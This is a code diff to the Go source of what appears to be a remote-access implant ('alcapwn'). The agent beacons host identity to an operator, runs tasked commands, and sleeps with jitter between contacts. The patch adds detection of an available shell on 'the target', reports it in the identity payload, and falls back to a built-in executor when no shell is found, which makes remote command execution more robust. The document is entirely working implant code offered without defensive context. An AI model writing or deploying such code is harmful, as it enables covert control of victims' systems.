@@ -26,6 +26,7 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strings"
 	"time"
 
 	"alcapwn/proto"
@@ -108,6 +109,33 @@ func runWithTransport(t Transport, hello proto.Hello) error {
 	}
 }
 
+// systemShell is the path of the first usable shell found on the target,
+// detected once at startup.  Empty means none was found and MiniExec is used.
+var systemShell = detectShell()
+
+// detectShell returns the first executable shell found on the target.
+func detectShell() string {
+	candidates := []string{
+		os.Getenv("SHELL"),
+		"/bin/bash",
+		"/bin/sh",
+		"/bin/dash",
+		"/usr/bin/bash",
+		"/usr/bin/sh",
+		"/usr/bin/env sh",
+		"/busybox",
+	}
+	for _, s := range candidates {
+		if s == "" {
+			continue
+		}
+		if _, err := os.Stat(strings.Fields(s)[0]); err == nil {
+			return s
+		}
+	}
+	return ""
+}
+
 // buildHello constructs the agent's identity payload sent on every connect.
 func buildHello() proto.Hello {
 	hostname, _ := os.Hostname()
@@ -125,6 +153,7 @@ func buildHello() proto.Hello {
 		Arch:      runtime.GOARCH,
 		User:      username,
 		UID:       uid,
+		Shell:     systemShell,
 	}
 }
 
@@ -164,13 +193,15 @@ func executeTask(task proto.Task) proto.Result {
 	return res
 }
 
-// runShell executes command via the system shell and returns combined output.
+// runShell executes command via the system shell, falling back to the
+// built-in MiniExec when no system shell is present on the target.
 func runShell(command string) ([]byte, error) {
-	shell := "/bin/sh"
-	if sh := os.Getenv("SHELL"); sh != "" {
-		shell = sh
+	if systemShell != "" {
+		parts := strings.Fields(systemShell)
+		bin, args := parts[0], append(parts[1:], "-c", command)
+		return exec.Command(bin, args...).CombinedOutput()
 	}
-	return exec.Command(shell, "-c", command).CombinedOutput()
+	return MiniExec(command)
 }
 
 // jitteredSleep sleeps for intervalSec plus up to jitterPct% additional time.
